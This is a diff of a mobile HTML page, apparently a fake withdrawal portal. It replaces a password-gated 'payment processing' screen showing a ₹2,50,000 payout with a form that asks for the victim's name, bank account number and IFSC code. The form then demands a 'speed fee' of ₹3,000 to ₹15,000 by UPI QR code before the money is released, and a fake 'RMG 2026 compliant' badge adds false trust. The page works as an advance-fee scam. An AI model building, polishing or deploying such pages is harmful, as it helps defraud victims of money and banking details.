@@ -6,812 +6,329 @@
   <meta name="theme-color" content="#12141a">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <title>Payment Processing</title>
+  <title>Withdraw · Bank</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-    }
-
-    body {
-      background-color: #0b0c10;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      min-height: 100dvh;
-      color: #ffffff;
-      -webkit-tap-highlight-color: transparent;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-    }
-
-    .app-container {
-      background-color: #12141a;
-      width: 100%;
-      max-width: 430px;
-      min-height: 100vh;
-      min-height: 100dvh;
-      display: flex;
-      flex-direction: column;
-      box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
-      position: relative;
-      overflow-y: auto;
-      overflow-x: hidden;
-      -webkit-overflow-scrolling: touch;
-    }
-
-    .screen {
-      display: none;
-      flex-direction: column;
-      width: 100%;
-      min-height: 100vh;
-      min-height: 100dvh;
-      padding: 20px 16px;
-      animation: fadeIn 0.3s ease;
-    }
-
-    @media (min-width: 380px) {
-      .screen {
-        padding: 24px 20px;
-      }
-    }
-
-    .screen.active {
-      display: flex;
-    }
-
-    .header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 20px;
-      padding: 4px 0;
-    }
-
-    .header h1 {
-      font-size: clamp(1rem, 3.5vw, 1.2rem);
-      font-weight: 600;
-      letter-spacing: -0.01em;
-    }
-
-    .icon-btn {
-      background: none;
-      border: none;
-      color: #c0c6d4;
-      font-size: clamp(1rem, 3.5vw, 1.15rem);
-      cursor: pointer;
-      padding: 8px;
-      border-radius: 8px;
-      transition: background 0.2s;
-      -webkit-tap-highlight-color: transparent;
-    }
-
-    .icon-btn:active {
-      background: rgba(255,255,255,0.05);
-    }
-
-    /* Password Section */
-    .auth-header {
-      text-align: center;
-      margin-top: clamp(20px, 5vh, 40px);
-      margin-bottom: clamp(20px, 4vh, 30px);
-    }
-
-    .auth-icon {
-      font-size: clamp(2.5rem, 8vw, 3.5rem);
-      color: #12b4ff;
-      margin-bottom: 14px;
-    }
-
-    .auth-title {
-      font-size: clamp(1.2rem, 4vw, 1.5rem);
-      font-weight: 600;
-      margin-bottom: 6px;
-    }
-
-    .auth-subtitle {
-      font-size: clamp(0.8rem, 2.5vw, 0.95rem);
-      color: #8b95a5;
-      padding: 0 10px;
-    }
-
-    .password-input-wrapper {
-      background-color: #1a1c23;
-      border: 1.5px solid #2a2f3a;
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      padding: clamp(12px, 3vw, 16px) clamp(14px, 3vw, 20px);
-      margin-bottom: 12px;
-      transition: border-color 0.2s;
-      -webkit-tap-highlight-color: transparent;
-    }
-
-    .password-input-wrapper:focus-within {
-      border-color: #12b4ff;
-    }
-
-    .password-input-wrapper i.lock-icon {
-      color: #8b95a5;
-      margin-right: 12px;
-      font-size: clamp(0.9rem, 2.5vw, 1.1rem);
-    }
-
-    .password-input-wrapper input {
-      background: transparent;
-      border: none;
-      color: #fff;
-      font-size: clamp(0.9rem, 2.8vw, 1.05rem);
-      flex: 1;
-      outline: none;
-      min-width: 0;
-    }
-
-    .password-input-wrapper input::placeholder {
-      color: #4a5162;
-    }
-
-    .toggle-password-btn {
-      background: none;
-      border: none;
-      color: #8b95a5;
-      cursor: pointer;
-      padding: 6px;
-      font-size: clamp(0.9rem, 2.5vw, 1.1rem);
-    }
-
-    .error-message {
-      color: #ff4757;
-      font-size: clamp(0.7rem, 2vw, 0.85rem);
-      margin-bottom: 14px;
-      display: none;
-    }
-
-    .verify-btn {
-      width: 100%;
-      background-color: #12b4ff;
-      color: #fff;
-      border: none;
-      border-radius: 10px;
-      padding: clamp(13px, 3vw, 16px);
-      font-size: clamp(0.9rem, 2.8vw, 1.05rem);
-      font-weight: 600;
-      cursor: pointer;
-      box-shadow: 0 4px 0 #0a84c2;
-      transition: all 0.1s ease;
-      margin-bottom: 8px;
-      -webkit-tap-highlight-color: transparent;
-      touch-action: manipulation;
-    }
-
-    .verify-btn:active {
-      transform: translateY(3px);
-      box-shadow: 0 1px 0 #0a84c2;
-    }
-
-    .verify-btn:disabled {
-      background-color: #152d22;
-      color: #2ed573;
-      box-shadow: 0 4px 0 #0f3d2a;
-      cursor: not-allowed;
-    }
-
-    .divider-line {
-      border: none;
-      border-top: 1px solid #2a2f3a;
-      margin: 16px 0;
-    }
-
-    /* Processing Section */
-    .processing-wrapper {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      padding: 5px 0 15px;
-    }
-
-    .processing-icon-container {
-      position: relative;
-      margin-bottom: clamp(16px, 4vh, 24px);
-      width: clamp(80px, 22vw, 100px);
-      height: clamp(80px, 22vw, 100px);
-    }
-
-    .processing-ring {
-      width: 100%;
-      height: 100%;
-      border-radius: 50%;
-      border: 3px solid #2a2f3a;
-      position: relative;
-      animation: rotateRing 2s linear infinite;
-    }
-
-    .processing-ring::before {
-      content: '';
-      position: absolute;
-      top: -3px;
-      left: -3px;
-      right: -3px;
-      bottom: -3px;
-      border-radius: 50%;
-      border: 3px solid transparent;
-      border-top-color: #12b4ff;
-      border-right-color: #fbbf24;
-      animation: rotateRing 1.5s linear infinite;
-    }
-
-    .processing-ring::after {
-      content: '';
-      position: absolute;
-      top: 5px;
-      left: 5px;
-      right: 5px;
-      bottom: 5px;
-      border-radius: 50%;
-      border: 2px solid transparent;
-      border-bottom-color: #2ed573;
-      border-left-color: #a855f7;
-      animation: rotateRing 2.5s linear infinite reverse;
-    }
-
-    @keyframes rotateRing {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .processing-icon-inner {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: clamp(1.6rem, 5vw, 2.2rem);
-      color: #12b4ff;
-      animation: pulseIcon 1.5s ease infinite;
-    }
-
-    @keyframes pulseIcon {
-      0%, 100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
-      50% { opacity: 0.5; transform: translate(-50%, -50%) scale(1.15); }
-    }
-
-    .dots-container {
-      display: flex;
-      gap: 5px;
-      justify-content: center;
-      margin: 12px 0;
-    }
-
-    .dot {
-      width: clamp(7px, 2vw, 10px);
-      height: clamp(7px, 2vw, 10px);
-      border-radius: 50%;
-      background: #12b4ff;
-      animation: dotBounce 1.4s ease infinite;
-    }
-
-    .dot:nth-child(2) { animation-delay: 0.2s; }
-    .dot:nth-child(3) { animation-delay: 0.4s; }
-    .dot:nth-child(4) { animation-delay: 0.6s; }
-
-    @keyframes dotBounce {
-      0%, 80%, 100% { transform: scale(0); opacity: 0.3; }
-      40% { transform: scale(1); opacity: 1; }
-    }
-
-    .processing-title {
-      font-size: clamp(1.1rem, 3.5vw, 1.4rem);
-      font-weight: 600;
-      margin-bottom: 6px;
-    }
-
-    .processing-subtitle {
-      font-size: clamp(0.75rem, 2.2vw, 0.9rem);
-      color: #fbbf24;
-      margin-bottom: 16px;
-    }
-
-    .progress-container {
-      width: 100%;
-      margin-bottom: 16px;
-    }
-
-    .progress-bar-bg {
-      background: #1e2130;
-      border-radius: 8px;
-      height: clamp(6px, 1.5vw, 8px);
-      overflow: hidden;
-    }
-
-    .progress-bar-fill {
-      background: linear-gradient(90deg, #12b4ff, #2ed573, #fbbf24);
-      background-size: 200% 100%;
-      height: 100%;
-      border-radius: 8px;
-      transition: width 0.5s ease;
-      animation: progressShine 3s ease infinite;
-    }
-
-    @keyframes progressShine {
-      0% { background-position: 200% 0; }
-      100% { background-position: -200% 0; }
-    }
-
-    .status-card {
-      background: #1a1c23;
-      border: 1px solid #2a2f3a;
-      border-radius: 12px;
-      padding: clamp(14px, 3vw, 20px) clamp(12px, 3vw, 16px);
-      width: 100%;
-      margin-bottom: 12px;
-    }
-
-    .status-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: clamp(7px, 1.5vh, 10px) 0;
-      border-bottom: 1px solid #1e2130;
-    }
-
-    .status-row:last-child {
-      border-bottom: none;
-    }
-
-    .status-label {
-      font-size: clamp(0.7rem, 2vw, 0.8rem);
-      color: #8b95a5;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      flex: 1;
-      min-width: 0;
-    }
-
-    .status-label i {
-      font-size: clamp(0.7rem, 2vw, 0.9rem);
-      width: 16px;
-      text-align: center;
-      flex-shrink: 0;
-    }
-
-    .status-value {
-      font-size: clamp(0.72rem, 2vw, 0.85rem);
-      font-weight: 600;
-      color: #cbd5e1;
-      flex-shrink: 0;
-      text-align: right;
-    }
-
-    .status-value.pending {
-      color: #fbbf24;
-    }
-
-    .status-value.processing {
-      color: #12b4ff;
-    }
-
-    .status-value.completed {
-      color: #2ed573;
-    }
-
-    .amount-card {
-      background: linear-gradient(135deg, #1a1c23, #1e2130);
-      border: 1px solid #2a2f3a;
-      border-radius: 12px;
-      padding: clamp(12px, 3vw, 16px);
-      width: 100%;
-      margin-bottom: 12px;
-      text-align: center;
-    }
-
-    .amount-label {
-      font-size: clamp(0.65rem, 1.8vw, 0.75rem);
-      color: #8b95a5;
-      margin-bottom: 3px;
-    }
-
-    .amount-value {
-      font-size: clamp(1.4rem, 4.5vw, 1.8rem);
-      font-weight: 700;
-      color: #ffffff;
-    }
-
-    .timer-card {
-      background: #0f172a;
-      border: 1px solid #fbbf24;
-      border-radius: 10px;
-      padding: clamp(10px, 2.5vw, 14px);
-      width: 100%;
-      margin-bottom: 12px;
-      text-align: center;
-    }
-
-    .timer-label {
-      font-size: clamp(0.65rem, 1.8vw, 0.75rem);
-      color: #8b95a5;
-      margin-bottom: 5px;
-    }
-
-    .timer-display {
-      font-size: clamp(1.2rem, 3.5vw, 1.5rem);
-      font-weight: 700;
-      color: #fbbf24;
-      font-family: 'Courier New', monospace;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 4px;
-      flex-wrap: wrap;
-    }
-
-    .timer-display i {
-      font-size: clamp(0.8rem, 2vw, 1rem);
-      animation: pulseIcon 1s infinite;
-    }
-
-    .timer-colon {
-      color: #8b95a5;
-    }
-
-    .back-home-btn {
-      background: transparent;
-      border: 1px solid #2a2f3a;
-      color: #c0c6d4;
-      padding: clamp(12px, 2.8vw, 14px) clamp(16px, 4vw, 24px);
-      border-radius: 10px;
-      font-weight: 500;
-      font-size: clamp(0.8rem, 2.2vw, 0.9rem);
-      cursor: pointer;
-      transition: 0.2s;
-      width: 100%;
-      -webkit-tap-highlight-color: transparent;
-      touch-action: manipulation;
-    }
-
-    .back-home-btn:active {
-      background: #1e212a;
-      border-color: #3b4252;
-    }
-
-    .hidden-section {
-      display: none;
-    }
-
-    .hidden-section.visible {
-      display: block;
-    }
-
-    /* Safe area for notch phones */
-    @supports (padding: env(safe-area-inset-bottom)) {
-      .screen {
-        padding-bottom: calc(20px + env(safe-area-inset-bottom));
-      }
-      
-      .back-home-btn {
-        margin-bottom: env(safe-area-inset-bottom);
-      }
-    }
-
-    /* Small screens */
-    @media (max-width: 340px) {
-      .screen {
-        padding: 14px 10px;
-      }
-      
-      .status-row {
-        flex-direction: column;
-        align-items: flex-start;
-        gap: 4px;
-      }
-      
-      .status-value {
-        text-align: left;
-      }
-      
-      .timer-display {
-        font-size: 1rem;
-      }
-    }
-
-    /* Landscape mode */
-    @media (max-height: 500px) and (orientation: landscape) {
-      .auth-header {
-        margin-top: 10px;
-        margin-bottom: 10px;
-      }
-      
-      .auth-icon {
-        font-size: 2rem;
-        margin-bottom: 8px;
-      }
-      
-      .processing-icon-container {
-        width: 60px;
-        height: 60px;
-        margin-bottom: 10px;
-      }
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; } to { opacity: 1; }
-    }
+    * { margin:0; padding:0; box-sizing:border-box; font-family:'Inter',-apple-system,sans-serif; }
+    body { background:#0b0c10; display:flex; justify-content:center; align-items:center; min-height:100vh; min-height:100dvh; color:#fff; -webkit-font-smoothing:antialiased; }
+    .app-container { background:#12141a; width:100%; max-width:430px; min-height:100vh; min-height:100dvh; display:flex; flex-direction:column; box-shadow:0 0 30px rgba(0,0,0,0.6); overflow-y:auto; overflow-x:hidden; padding:20px 16px 30px; }
+    @media(min-width:380px){ .app-container{ padding:24px 20px 30px; } }
+    .header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; }
+    .header h1 { font-size:clamp(1rem,3.5vw,1.2rem); font-weight:600; letter-spacing:-0.01em; }
+    .icon-btn { background:none; border:none; color:#c0c6d4; font-size:clamp(1rem,3.5vw,1.15rem); padding:8px; border-radius:8px; cursor:pointer; transition:background 0.2s; }
+    .icon-btn:active { background:rgba(255,255,255,0.05); }
+    .card { background:#1a1c23; border:1px solid #2a2f3a; border-radius:16px; padding:16px 14px; margin-bottom:16px; }
+    .card-title { font-size:0.85rem; font-weight:500; color:#8b95a5; margin-bottom:12px; display:flex; align-items:center; gap:6px; }
+    .input-group { margin-bottom:12px; }
+    .input-group label { font-size:0.7rem; color:#8b95a5; display:block; margin-bottom:4px; font-weight:500; letter-spacing:0.3px; }
+    .input-group input, .input-group select { width:100%; background:#0f1118; border:1px solid #2a2f3a; border-radius:10px; padding:12px 14px; color:#fff; font-size:0.9rem; outline:none; transition:border 0.2s; }
+    .input-group input:focus, .input-group select:focus { border-color:#12b4ff; }
+    .input-group select option { background:#1a1c23; color:#fff; }
+    .bank-search-wrap { position:relative; }
+    .bank-search-wrap input { padding-left:36px; }
+    .bank-search-wrap i { position:absolute; left:12px; top:50%; transform:translateY(-50%); color:#8b95a5; font-size:0.9rem; }
+    .speed-options { display:flex; flex-direction:column; gap:12px; margin:10px 0 8px; }
+    .speed-option { background:#0f1118; border:1.5px solid #2a2f3a; border-radius:14px; padding:14px 14px 12px; cursor:pointer; transition:all 0.15s; display:flex; flex-direction:column; }
+    .speed-option.selected { border-color:#12b4ff; background:#18222e; box-shadow:0 0 0 1px #12b4ff44; }
+    .speed-option .top-row { display:flex; justify-content:space-between; align-items:center; }
+    .speed-option .label { font-weight:600; font-size:0.95rem; }
+    .speed-option .fee { background:#1e293b; padding:4px 12px; border-radius:30px; font-size:0.75rem; font-weight:600; color:#fbbf24; }
+    .speed-option .desc { font-size:0.7rem; color:#8b95a5; margin-top:6px; line-height:1.4; }
+    .speed-option .sub-desc { font-size:0.65rem; color:#5a6375; margin-top:2px; }
+    .continue-btn { width:100%; background:#12b4ff; border:none; border-radius:12px; padding:14px; font-weight:600; font-size:1rem; color:#fff; box-shadow:0 4px 0 #0a84c2; transition:all 0.1s; cursor:pointer; margin-top:6px; }
+    .continue-btn:active { transform:translateY(3px); box-shadow:0 1px 0 #0a84c2; }
+    .continue-btn:disabled { background:#2a2f3a; box-shadow:none; color:#6a7285; cursor:not-allowed; }
+    .payment-page { display:none; flex-direction:column; animation:fadeIn 0.3s; }
+    .payment-page.active { display:flex; }
+    .main-page { display:flex; flex-direction:column; }
+    .main-page.hidden { display:none; }
+    .qr-section { text-align:center; margin:12px 0; }
+    .qr-section img { max-width:200px; width:100%; border-radius:12px; background:#fff; padding:8px; box-shadow:0 0 20px rgba(18,180,255,0.2); }
+    .payment-detail-grid { display:flex; flex-direction:column; gap:6px; background:#0f1118; padding:12px 14px; border-radius:12px; margin:8px 0 10px; }
+    .payment-detail-grid .row { display:flex; justify-content:space-between; font-size:0.85rem; padding:4px 0; border-bottom:1px solid #1e2130; }
+    .payment-detail-grid .row:last-child { border-bottom:none; }
+    .payment-detail-grid .label { color:#8b95a5; }
+    .payment-detail-grid .value { font-weight:500; color:#fff; }
+    .highlight-fee { color:#fbbf24; font-weight:700; }
+    .back-home-btn { background:transparent; border:1px solid #2a2f3a; color:#c0c6d4; padding:12px; border-radius:10px; font-weight:500; font-size:0.85rem; cursor:pointer; width:100%; margin-top:8px; transition:0.2s; }
+    .back-home-btn:active { background:#1e212a; }
+    .text-muted { color:#8b95a5; font-size:0.7rem; }
+    @keyframes fadeIn { from{opacity:0;} to{opacity:1;} }
+    @media(max-width:340px){ .app-container{ padding:14px 10px; } .speed-option{ padding:12px; } }
   </style>
 </head>
 <body>
-<div class="app-container">
-  <!-- MAIN SCREEN -->
-  <div id="main-screen" class="screen active">
-    <!-- Header -->
+<div class="app-container" id="app">
+
+  <!-- MAIN PAGE -->
+  <div class="main-page" id="mainPage">
     <header class="header">
       <button class="icon-btn" aria-label="Back"><i class="fa-solid fa-chevron-left"></i></button>
-      <h1>Payment Processing</h1>
+      <h1>Withdraw Funds</h1>
       <button class="icon-btn" aria-label="Support"><i class="fa-solid fa-headset"></i></button>
     </header>
 
-    <!-- PASSWORD SECTION -->
-    <div id="password-section">
-      <div class="auth-header">
-        <i class="fa-solid fa-shield-halved auth-icon"></i>
-        <h2 class="auth-title">Security Verification</h2>
-        <p class="auth-subtitle">Enter password to view payment status</p>
+    <!-- Bank details -->
+    <div class="card">
+      <div class="card-title"><i class="fa-solid fa-building-columns" style="color:#12b4ff;"></i> Bank Account</div>
+      <div class="input-group">
+        <label><i class="fa-regular fa-user"></i> Account Holder Name</label>
+        <input type="text" id="accName" placeholder="Full name as per bank" value="">
       </div>
-
-      <div class="password-input-wrapper">
-        <i class="fa-solid fa-lock lock-icon"></i>
-        <input type="password" id="withdraw-password" placeholder="Enter password" autocomplete="off" inputmode="text">
-        <button type="button" class="toggle-password-btn" id="toggle-password" aria-label="Toggle password">
-          <i class="fa-solid fa-eye" id="eye-icon"></i>
-        </button>
+      <div class="input-group">
+        <label><i class="fa-regular fa-credit-card"></i> Account Number</label>
+        <input type="text" id="accNumber" placeholder="Enter account number" value="">
       </div>
-      <p class="error-message" id="password-error"><i class="fa-solid fa-circle-exclamation"></i> Incorrect password</p>
-      <button class="verify-btn" id="verify-btn">Verify & View Status</button>
-    </div>
-
-    <hr class="divider-line" id="divider1">
-
-    <!-- PROCESSING SECTION (Hidden) -->
-    <div id="processing-section" class="hidden-section">
-      <div class="processing-wrapper">
-        <!-- User Info -->
-        <p style="color:#8b95a5; font-size:clamp(0.7rem, 2vw, 0.85rem);">Welcome</p>
-        <p style="color:#12b4ff; font-weight:700; font-size:clamp(0.85rem, 2.5vw, 1rem); margin-bottom:12px;">User422945HB</p>
-
-        <!-- Animated Processing Icon -->
-        <div class="processing-icon-container">
-          <div class="processing-ring">
-            <div class="processing-icon-inner">
-              <i class="fa-solid fa-credit-card"></i>
-            </div>
-          </div>
-        </div>
-
-        <!-- Dots Animation -->
-        <div class="dots-container">
-          <div class="dot"></div>
-          <div class="dot"></div>
-          <div class="dot"></div>
-          <div class="dot"></div>
-        </div>
-
-        <h2 class="processing-title">Payment Processing</h2>
-        <p class="processing-subtitle">
-          <i class="fa-solid fa-spinner fa-spin"></i> Your transaction is being processed
-        </p>
-
-        <!-- Progress Bar -->
-        <div class="progress-container">
-          <div class="progress-bar-bg">
-            <div class="progress-bar-fill" id="progressBar" style="width: 0%;"></div>
-          </div>
-        </div>
-
-        <!-- Status Card -->
-        <div class="status-card">
-          <div class="status-row">
-            <span class="status-label">
-              <i class="fa-solid fa-file-invoice-dollar" style="color:#fbbf24;"></i> Transfer Tax
-            </span>
-            <span class="status-value completed">₹7,000 Paid ✓</span>
-          </div>
-          <div class="status-row">
-            <span class="status-label">
-              <i class="fa-solid fa-building-columns" style="color:#12b4ff;"></i> Withdrawal Amount
-            </span>
-            <span class="status-value">₹2,50,000</span>
-          </div>
-          <div class="status-row">
-            <span class="status-label">
-              <i class="fa-solid fa-clock" style="color:#a855f7;"></i> Status
-            </span>
-            <span class="status-value processing" id="statusText">Processing...</span>
-          </div>
-          <div class="status-row">
-            <span class="status-label">
-              <i class="fa-solid fa-check-circle" style="color:#2ed573;"></i> Expected
-            </span>
-            <span class="status-value" style="color:#2ed573;">Within 1 hour</span>
-          </div>
-        </div>
-
-        <!-- Amount Card -->
-        <div class="amount-card">
-          <p class="amount-label">Total Receivable Amount</p>
-          <p class="amount-value">₹2,50,000</p>
-        </div>
-
-        <!-- Timer Card -->
-        <div class="timer-card">
-          <p class="timer-label">
-            <i class="fa-solid fa-hourglass-half"></i> Time remaining for transfer
-          </p>
-          <div class="timer-display">
-            <span id="timer-hours">05</span><span class="timer-colon">h</span>
-            <span id="timer-minutes">00</span><span class="timer-colon">m</span>
-            <span id="timer-seconds">00</span><span class="timer-colon">s</span>
-          </div>
-        </div>
-
-        <p style="color:#8b95a5; font-size:clamp(0.6rem, 1.8vw, 0.75rem); margin-bottom:12px;">
-          <i class="fa-solid fa-shield-halved"></i> RMG 2026 Compliant · Secure Transaction
-        </p>
-
-        <button class="back-home-btn" id="back-home-btn">
-          <i class="fa-solid fa-arrow-left"></i> Back to Home
-        </button>
+      <div class="input-group">
+        <label><i class="fa-regular fa-code"></i> IFSC Code</label>
+        <input type="text" id="ifscCode" placeholder="e.g. SBIN0001234" value="">
+      </div>
+      <div class="input-group bank-search-wrap">
+        <i class="fa-regular fa-building"></i>
+        <input type="text" id="bankSearch" placeholder="Search bank by name..." oninput="filterBanks()" value="">
+      </div>
+      <div class="input-group">
+        <label><i class="fa-regular fa-arrow-down"></i> Bank Name</label>
+        <select id="bankSelect" size="1">
+          <!-- all india banks loaded by js -->
+        </select>
+      </div>
+      <div class="input-group" style="margin-bottom:0;">
+        <label><i class="fa-regular fa-money-bill-1"></i> Withdrawal Amount</label>
+        <input type="text" id="withdrawAmount" value="₹2,50,000" disabled style="background:#1a1c23; color:#cbd5e1;">
       </div>
     </div>
+
+    <!-- Speed options -->
+    <div class="card" style="border-color:#2a2f3a;">
+      <div class="card-title"><i class="fa-regular fa-clock" style="color:#fbbf24;"></i> Choose speed</div>
+      <div class="speed-options" id="speedOptions">
+        <div class="speed-option selected" data-speed="instant" data-fee="15000">
+          <div class="top-row">
+            <span class="label"><i class="fa-solid fa-bolt" style="color:#12b4ff;"></i> Instant (within 2 hrs)</span>
+            <span class="fee">₹15,000</span>
+          </div>
+          <div class="desc">Priority processing · 24/7 support · direct transfer</div>
+          <div class="sub-desc">Estimated time: 1–2 hours</div>
+        </div>
+        <div class="speed-option" data-speed="1week" data-fee="7000">
+          <div class="top-row">
+            <span class="label"><i class="fa-regular fa-calendar-week" style="color:#a855f7;"></i> Within 1 week</span>
+            <span class="fee">₹7,000</span>
+          </div>
+          <div class="desc">Standard processing · tracked</div>
+          <div class="sub-desc">Estimated time: 3–7 days</div>
+        </div>
+        <div class="speed-option" data-speed="1month" data-fee="3000">
+          <div class="top-row">
+            <span class="label"><i class="fa-regular fa-calendar" style="color:#2ed573;"></i> Within 1 month</span>
+            <span class="fee">₹3,000</span>
+          </div>
+          <div class="desc">Economy processing · low fee</div>
+          <div class="sub-desc">Estimated time: 15–30 days</div>
+        </div>
+      </div>
+    </div>
+
+    <button class="continue-btn" id="continueBtn" disabled>Continue to Payment</button>
+    <p style="color:#4a5162; font-size:0.6rem; text-align:center; margin:8px 0;">All transactions are secure &amp; RMG 2026 compliant</p>
+  </div>
+
+  <!-- PAYMENT PAGE -->
+  <div class="payment-page" id="paymentPage">
+    <header class="header">
+      <button class="icon-btn" id="backFromPayment" aria-label="Back"><i class="fa-solid fa-arrow-left"></i></button>
+      <h1>Confirm Payment</h1>
+      <button class="icon-btn" aria-label="Support"><i class="fa-solid fa-headset"></i></button>
+    </header>
+
+    <div class="card" style="border-color:#12b4ff55;">
+      <div class="card-title"><i class="fa-regular fa-circle-check" style="color:#2ed573;"></i> Withdrawal summary</div>
+      <div class="payment-detail-grid">
+        <div class="row"><span class="label">Account</span><span class="value" id="payAccName">—</span></div>
+        <div class="row"><span class="label">Account No.</span><span class="value" id="payAccNum">—</span></div>
+        <div class="row"><span class="label">Bank</span><span class="value" id="payBank">—</span></div>
+        <div class="row"><span class="label">IFSC</span><span class="value" id="payIfsc">—</span></div>
+        <div class="row"><span class="label">Amount</span><span class="value" style="color:#12b4ff;">₹2,50,000</span></div>
+        <div class="row"><span class="label">Speed</span><span class="value" id="paySpeed">Instant</span></div>
+        <div class="row"><span class="label">Fee</span><span class="value highlight-fee" id="payFee">₹15,000</span></div>
+        <div class="row" style="border-bottom:none; padding-top:6px;"><span class="label">Total debit</span><span class="value" style="color:#fbbf24; font-weight:700;" id="payTotal">₹2,65,000</span></div>
+      </div>
+    </div>
+
+    <div class="qr-section">
+      <p style="color:#8b95a5; font-size:0.75rem; margin-bottom:6px;"><i class="fa-regular fa-qrcode"></i> Scan to pay fee</p>
+      <img src="https://github.com/user-attachments/assets/b4b0c3aa-375b-48f5-a022-22d0b300cd06" alt="QR code for payment" style="max-width:190px; width:100%;">
+    </div>
+
+    <div style="background:#0f1118; border-radius:12px; padding:12px 14px; margin:4px 0 8px; border-left:3px solid #fbbf24;">
+      <p style="font-size:0.8rem; color:#cbd5e1;"><i class="fa-regular fa-circle-info" style="color:#12b4ff;"></i> Please scan the QR code with your UPI app to pay the processing fee. After successful payment, your withdrawal will be initiated.</p>
+    </div>
+
+    <button class="back-home-btn" id="paymentDoneBtn"><i class="fa-regular fa-check-circle"></i> I have paid, proceed</button>
+    <button class="back-home-btn" id="cancelPaymentBtn" style="margin-top:8px; border-color:#3a2f2f; color:#8b95a5;"><i class="fa-regular fa-xmark"></i> Cancel</button>
   </div>
 </div>
 
 <script>
   (function() {
-    // Password elements
-    const passwordInput = document.getElementById('withdraw-password');
-    const verifyBtn = document.getElementById('verify-btn');
-    const errorMsg = document.getElementById('password-error');
-    const togglePassBtn = document.getElementById('toggle-password');
-    const eyeIcon = document.getElementById('eye-icon');
+    // ---------- ALL INDIA BANKS (comprehensive list) ----------
+    const allBanks = [
+      "State Bank of India", "HDFC Bank", "ICICI Bank", "Axis Bank", "Kotak Mahindra Bank",
+      "Yes Bank", "Punjab National Bank", "Bank of Baroda", "Canara Bank", "Union Bank of India",
+      "IDFC First Bank", "IndusInd Bank", "Central Bank of India", "Indian Bank", "UCO Bank",
+      "Bank of India", "Indian Overseas Bank", "Punjab & Sind Bank", "Jammu & Kashmir Bank",
+      "RBL Bank", "Bandhan Bank", "South Indian Bank", "Karur Vysya Bank", "City Union Bank",
+      "Tamilnad Mercantile Bank", "Dhanlaxmi Bank", "Federal Bank", "IDBI Bank", "Saraswat Bank",
+      "Abhyudaya Co-operative Bank", "Airtel Payments Bank", "Paytm Payments Bank", "Fino Payments Bank",
+      "Jana Small Finance Bank", "Equitas Small Finance Bank", "Ujjivan Small Finance Bank",
+      "Suryoday Small Finance Bank", "Utkarsh Small Finance Bank", "ESAF Small Finance Bank",
+      "Shivalik Small Finance Bank", "North East Small Finance Bank", "Capital Small Finance Bank",
+      "Au Small Finance Bank", "Rajasthan Marudhara Gramin Bank", "Baroda Rajasthan Kshetriya Gramin Bank",
+      "Marwar Gramin Bank", "Bihar Gramin Bank", "Uttar Bihar Gramin Bank", "Madhubani Gramin Bank",
+      "Kashi Gomti Samyut Gramin Bank", "Prathama UP Gramin Bank", "Baroda UP Gramin Bank",
+      "Aryavart Bank", "Madhya Pradesh Gramin Bank", "Narmada Jhabua Gramin Bank",
+      "Chhattisgarh Rajya Gramin Bank", "Karnataka Gramin Bank", "Kaveri Gramin Bank",
+      "Kerala Gramin Bank", "Odisha Gramya Bank", "Utkal Gramin Bank", "Assam Gramin Vikash Bank",
+      "Tripura Gramin Bank", "Manipur Rural Bank", "Meghalaya Rural Bank", "Mizoram Rural Bank",
+      "Nagaland Rural Bank", "Sikkim Gramin Bank", "Himachal Pradesh Gramin Bank",
+      "Haryana Gramin Bank", "Punjab Gramin Bank", "Rajasthan Marudhara Gramin Bank",
+      "Surat People's Co-operative Bank", "Sardar Bhiladwala Pardi People's Co-op Bank",
+      "Bharat Co-operative Bank", "Kalyan Janata Sahakari Bank", "NKGSB Co-operative Bank",
+      "TJSB Sahakari Bank", "Cosmos Co-operative Bank", "Janata Sahakari Bank (Pune)",
+      "Mahanagar Co-operative Bank", "Pune Sahakari Bank", "Shamrao Vithal Co-operative Bank",
+      "SVC Co-operative Bank", "Gujarat State Co-operative Bank", "Maharashtra State Co-op Bank",
+      "Tamil Nadu State Apex Co-op Bank", "Delhi State Co-operative Bank", "Karnataka State Co-op Apex Bank",
+      "Andhra Pradesh State Co-op Bank", "Telangana State Co-op Apex Bank", "Kerala State Co-op Bank",
+      "The Bank of Nova Scotia", "Citibank India", "Deutsche Bank India", "HSBC India", "Standard Chartered India",
+      "DBS Bank India", "Barclays India", "Bnp Paribas India", "Citi Union Bank", "Cooperative Bank of India"
+    ];
 
-    // Sections
-    const processingSection = document.getElementById('processing-section');
-    const divider1 = document.getElementById('divider1');
+    // populate select
+    const bankSelect = document.getElementById('bankSelect');
+    allBanks.forEach(b => {
+      const opt = document.createElement('option');
+      opt.value = b;
+      opt.textContent = b;
+      bankSelect.appendChild(opt);
+    });
 
-    // Timer elements
-    const timerHours = document.getElementById('timer-hours');
-    const timerMinutes = document.getElementById('timer-minutes');
-    const timerSeconds = document.getElementById('timer-seconds');
-    const progressBar = document.getElementById('progressBar');
-    const statusText = document.getElementById('statusText');
-
-    // Back button
-    const backHomeBtn = document.getElementById('back-home-btn');
-
-    // localStorage key
-    const STORAGE_KEY = 'paymentProcessingTimer_User422945HB';
-
-    // Password
-    const REQUIRED_PASSWORD = "User4229@2lakh";
-
-    let timerInterval = null;
-
-    function getTimerEndTime() {
